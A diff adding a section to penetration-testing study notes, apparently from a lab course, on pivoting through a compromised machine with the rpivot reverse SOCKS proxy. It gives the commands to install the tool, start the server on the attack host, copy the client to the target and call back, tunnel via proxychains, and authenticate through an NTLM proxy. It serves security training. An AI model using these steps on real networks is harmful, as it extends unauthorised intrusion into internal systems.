@@ -750,3 +750,73 @@ sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v
 - No need for additional proxy configurations.
 - Direct tool usage after setup.
 
+# Web Server Pivoting with Rpivot
+## **Overview**
+- **Rpivot**: Reverse SOCKS proxy for tunneling through a compromised machine.
+- Exposes internal network ports on an external server.
+
+## **Steps**
+
+### **1. Clone Rpivot**
+```bash
+git clone https://github.com/klsecservices/rpivot.git
+```
+
+### **2. Install Python 2.7**
+#### **Option 1**: Using APT
+```bash
+sudo apt-get install python2.7
+```
+#### **Option 2**: Using Pyenv
+```bash
+curl https://pyenv.run | bash
+echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
+echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
+echo 'eval "$(pyenv init -)"' >> ~/.bashrc
+source ~/.bashrc
+pyenv install 2.7
+pyenv shell 2.7
+```
+
+### **3. Start Rpivot Server**
+Run on **attack host**:
+```bash
+python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
+```
+
+### **4. Transfer Rpivot to Target**
+Run from **attack host**:
+```bash
+scp -r rpivot ubuntu@<TargetIP>:/home/ubuntu/
+```
+
+### **5. Start Rpivot Client**
+Run on **target machine**:
+```bash
+python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
+```
+
+- `10.10.14.18`: Attack host's IP.
+- `9999`: Server port.
+
+### **6. Configure Proxychains**
+Edit `proxychains.conf` to include:
+```plaintext
+socks4 127.0.0.1 9050
+```
+
+### **7. Access Target Web Server**
+Run from **attack host**:
+```bash
+proxychains firefox-esr 172.16.5.135:80
+```
+Similar to the pivot proxy above, there could be scenarios when we cannot directly pivot to an external server (attack host) on the cloud. Some organizations have HTTP-proxy with NTLM authentication configured with the Domain Controller. In such cases, we can provide an additional NTLM authentication option to rpivot to authenticate via the NTLM proxy by providing a username and password. In these cases, we could use rpivot's client.py in the following way:
+```
+python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
+```
+---
+
+## **Key Notes**
+- Rpivot establishes a SOCKS proxy tunnel through a compromised machine.
+- Allows access to internal web servers (e.g., `172.16.5.135:80`) from the attacker's machine using Proxychains.
+```
